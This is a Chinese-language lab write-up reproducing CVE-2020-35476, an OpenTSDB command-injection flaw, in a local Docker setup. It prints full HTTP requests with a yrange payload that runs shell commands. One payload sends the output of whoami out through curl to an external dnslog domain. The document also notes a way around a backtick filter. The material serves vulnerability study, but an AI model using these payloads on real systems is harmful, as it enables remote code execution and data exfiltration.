web漏洞实验4

1.搭建opentsdb–CVE-2020-35476

docker-compose up -d

2. 漏洞成因

使用yrange参数中的命令注入（其他参数也可能存在漏洞）

通过参数之一传递有效负载时，它会写入**/tmp目录中的gnuplot文件，并且OpenTSDB通过/src/mygnuplot.sh** shell 脚本执行gnuplot文件。

3.复现

3.1 metric 获取

利用如下地址来查看metric

http://172.20.0.2:4242/api/suggest?type=metrics&q=&max=10

抓包结果为空

3.2 POST添加metric

当前OpenTSDB开启了自动创建metric功能（tsd.core.auto_create_metrics = true），所以我们可以使用如下API创建一个名为sys.cpu.nice的metric并添加一条记录：

POST /api/put/ HTTP/1.1
Host: 172.20.0.2:4242
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 150

{
    "metric": "sys.cpu.nice",
    "timestamp": 1346846400,
    "value": 20,
    "tags": {
       "host": "web01",
       "dc": "lga"
    }
}

3.3 payload

发送如下数据包，其中参数m的值必须包含一个有数据的metric：

GET /q?start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[0:system(%27touch%20/tmp/success%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json HTTP/1.1
Host: 172.20.0.2:4242
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close

这里要注意GET请求包要多两行（9行）不然无回显

回显400

可以看到 success成功创建

4.Dns外带回显whoami

这里会看到dnslog外带的结果来自本地回复 wireshark抓包

抓本地环回口有icmp 也可以抓网卡的dns

初步可以理解为 dnslog的子域名dns解析成127.0.0.1

有两种高优先级命令执行

`whoami`
$(whoami)

这里反引号有过滤

因此使用$(whoami)如下图

payload:

system(%27curl+$(whoami).4.fs8lv4.ceye.io%27)

也可以看出 只需要对引号进行url编码 而.号可以直接传入

外带成功
